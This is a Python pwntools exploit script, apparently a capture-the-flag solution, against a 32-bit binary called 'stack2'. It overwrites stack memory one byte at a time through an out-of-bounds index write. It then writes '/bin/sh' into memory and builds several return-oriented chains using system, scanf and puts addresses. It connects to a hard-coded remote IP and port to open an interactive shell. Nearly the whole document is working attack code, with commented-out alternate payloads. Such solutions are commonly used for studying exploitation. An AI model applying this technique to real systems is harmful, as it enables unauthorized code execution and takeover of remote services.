from pwn import *
def wt(off,ch):
	p.readuntil("exit")
	p.sendline("3");
	p.readuntil("which number to change:\n")
	p.sendline(str(off))
	p.readuntil("new number:\n")
	p.sendline(ch)
def wt4(off,ch):
	wt(off+0,str(ord(ch[0])));
	wt(off+1,str(ord(ch[1])));
	wt(off+2,str(ord(ch[2])));
	wt(off+3,str(ord(ch[3])));
	
system_plt=0x8048450
system_got=0x804a018
scanf_plt=0x8048480
scanf_got=0x804a024
puts_plt=0x8048440
puts_got=0x804a014
bss=0x0804a000+0x100
p2r=0x0804895a
pr= 0x08048405
p=process("./stack2")
p=remote("47.96.239.28",2333)
context.log_level="debug"
p.readuntil("have:")
p.sendline("1");
p.sendline("1");
wt4(0x00,"/bin")
wt4(0x04,"/sh\0")
c=2
if c==1:
	wt4(0x84,p32(system_plt))
	wt4(0x8c,p32(0xffffced8))
if c==2:
	wt4(0x84,p32(scanf_plt))
	wt4(0x88,p32(p2r))
	wt4(0x8c,p32(0x8048a97))
	wt4(0x90,p32(bss))
	wt4(0x94,p32(system_plt))
	wt4(0x9c,p32(bss))
if c==3:
	wt4(0x84,p32(puts_plt))
	wt4(0x88,p32(pr))
	wt4(0x8c,p32(system_got))
	wt4(0x90,p32(puts_plt))
	wt4(0x94,p32(pr))
	wt4(0x98,p32(puts_got))
debug=0
if debug==1:
	gdb.attach(p,'''
	b *0xf7e3ec94
	''')
p.sendline("5")

p.sendline("26739")
p.interactive()
0x8048456
#p32(puts)+p32(pr)+p32(system_got)+p32(puts)+p32(pr)+p32(puts_got)
#p32(scanf)+p32(p2r)+p32(0x8048a97)+p32(bss)+p32(sys)+p32(0xdeadbeef)+p32(bss)
#start at 0xffffced8
#ret_addr 0xffffcf5c
